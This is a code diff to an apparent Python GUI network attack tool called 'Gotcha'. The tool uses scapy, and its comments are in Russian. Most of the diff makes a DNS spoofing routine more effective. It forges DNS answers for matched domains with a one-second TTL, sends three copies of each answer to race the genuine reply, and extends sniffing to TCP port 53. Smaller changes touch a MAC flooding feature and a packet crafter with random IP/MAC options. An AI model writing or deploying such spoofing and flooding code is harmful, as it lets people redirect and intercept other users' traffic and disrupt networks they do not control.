@@ -1974,16 +1974,16 @@ class Gotcha:
         def handle_dns_packet(packet):
             if not self.dns_spoof_running:
                 return True
-            if DNS in packet and packet[DNS].qr == 0:  # query
+            # Перехватываем только DNS-запросы (qr=0)
+            if DNS in packet and packet[DNS].qr == 0:
                 qname = packet[DNS].qd.qname.decode('utf-8').rstrip('.')
-                # Find matching rule
                 spoof_ip = None
                 with self.dns_spoof_lock:
-                    # exact match
+                    # Точное совпадение
                     if qname in self.dns_spoof_rules:
                         spoof_ip = self.dns_spoof_rules[qname]
                     else:
-                        # wildcard match (*.example.com)
+                        # Маски (например, *.example.com)
                         for pattern, ip in self.dns_spoof_rules.items():
                             if pattern.startswith("*.") and qname.endswith(pattern[1:]):
                                 spoof_ip = ip
@@ -1992,6 +1992,7 @@ class Gotcha:
                                 spoof_ip = ip
                 if spoof_ip:
                     try:
+                        # Создаём поддельный ответ
                         if IPv6 in packet:
                             ip_layer = IPv6(src=packet[IPv6].dst, dst=packet[IPv6].src)
                         else:
@@ -2005,28 +2006,41 @@ class Gotcha:
                             aa=1,
                             ra=0,
                             qd=packet[DNS].qd,
-                            an=DNSRR(rrname=qname, ttl=self.dns_spoof_ttl, rdata=spoof_ip)
+                            an=DNSRR(rrname=qname, ttl=1, rdata=spoof_ip)  # TTL = 1 секунда
                         )
 
                         response = ip_layer / udp_layer / dns_response
-                        send(response, verbose=0, iface=self.dns_spoof_interface.get())
+
+                        # Отправляем 3 копии с задержкой 1 мс, чтобы опередить реальный ответ
+                        for attempt in range(3):
+                            send(response, verbose=0, iface=self.dns_spoof_interface.get())
+                            time.sleep(0.001)
+
                         with self.dns_spoof_lock:
                             self.dns_spoof_stats['spoofed'] += 1
-                        self.dns_spoof_log.insert('end', f"[SPOOF] {qname} -> {spoof_ip} (TTL={self.dns_spoof_ttl})\n")
+
+                        self.dns_spoof_log.insert('end', f"[SPOOF] {qname} -> {spoof_ip} (3 копии, TTL=1)\n")
                         self.dns_spoof_log.see('end')
+
                     except Exception as e:
-                        self.dns_spoof_log.insert('end', f"[ERROR] Failed to spoof {qname}: {str(e)}\n")
+                        self.dns_spoof_log.insert('end', f"[ERROR] {qname}: {str(e)}\n")
                 else:
-                    # Not spoofed, just log
                     self.dns_spoof_log.insert('end', f"[PASS] {qname}\n")
                     self.dns_spoof_log.see('end')
+
                 with self.dns_spoof_lock:
                     self.dns_spoof_stats['intercepted'] += 1
+
             return False
 
+        # Перехватываем и UDP (53), и TCP (53) – для надёжности
         try:
-            sniff(iface=self.dns_spoof_interface.get(), filter="udp port 53", prn=handle_dns_packet,
-                  stop_filter=lambda x: not self.dns_spoof_running)
+            sniff(
+                iface=self.dns_spoof_interface.get(),
+                filter="udp port 53 or tcp port 53",
+                prn=handle_dns_packet,
+                stop_filter=lambda x: not self.dns_spoof_running
+            )
         except Exception as e:
             self.dns_spoof_log.insert('end', f"Sniffing error: {str(e)}\n")
 
@@ -2068,12 +2082,6 @@ class Gotcha:
         self.mac_interface = ttk.Combobox(row1, width=25, font=('Arial', 9), values=self.network_interfaces)
         self.mac_interface.pack(side='left', padx=2)
         self.mac_interface.set(self.active_interface)
-        row2 = ttk.Frame(params_frame)
-        row2.pack(fill='x', padx=5, pady=5)
-        ttk.Label(row2, text="Потоков:", width=12).pack(side='left', padx=2)
-        self.mac_threads = ttk.Entry(row2, width=10, font=('Arial', 9))
-        self.mac_threads.pack(side='left', padx=2)
-        self.mac_threads.insert(0, "4")
         row3 = ttk.Frame(params_frame)
         row3.pack(fill='x', padx=5, pady=5)
         ttk.Label(row3, text="Время (сек):", width=12).pack(side='left', padx=2)
@@ -2130,7 +2138,7 @@ class Gotcha:
         self.mac_stop_btn.config(state='normal')
         try:
             interface = self.mac_interface.get()
-            threads = int(self.mac_threads.get())
+            threads = 1
             duration = int(self.mac_duration.get())
             dst_mac = self.mac_dst.get().strip()
             random_mac = self.mac_random.get()
@@ -2303,19 +2311,37 @@ class Gotcha:
             'total_bytes': 0
         }
         self.on_protocol_change()
-
+        
     def on_protocol_change(self, event=None):
         proto = self.custom_protocol.get()
+
+        # 1. Управление полем порта
         if proto in ["TCP", "UDP"]:
             self.custom_port_frame.pack(fill='x', padx=5, pady=5, before=self.custom_options_frame
                                         if self.custom_options_frame.winfo_ismapped() else self.custom_row7)
         else:
             self.custom_port_frame.pack_forget()
-        if proto in ["TCP", "ARP", "ICMP"]:
+
+        # 2. Управление полем размера пакета
+        if proto in ["ARP", "DNS"]:
+            # Скрываем
+            self.custom_packet_size.master.pack_forget()
+        else:
+            # Показываем, но на правильном месте: перед custom_options_frame (если он виден) или перед custom_row7
+            if not self.custom_packet_size.master.winfo_ismapped():
+                target = self.custom_options_frame if self.custom_options_frame.winfo_ismapped() else self.custom_row7
+                self.custom_packet_size.master.pack(fill='x', padx=5, pady=5, before=target)
+            # Восстанавливаем значение, если было обнулено
+            if self.custom_packet_size.get() == "0":
+                self.custom_packet_size.delete(0, tk.END)
+                self.custom_packet_size.insert(0, "1024")
+
+        # 3. Управление опциями случайного IP/MAC
+        if proto in ["TCP", "ARP", "ICMP", "UDP"]:
             self.custom_options_frame.pack(fill='x', padx=5, pady=5, before=self.custom_row7)
         else:
             self.custom_options_frame.pack_forget()
-
+            
     def run_external_tool(self, args, log_widget, stop_event, process_key, infinite=False, on_finish=None, stats_callback=None):
         try:
             if platform.system() == "Windows":
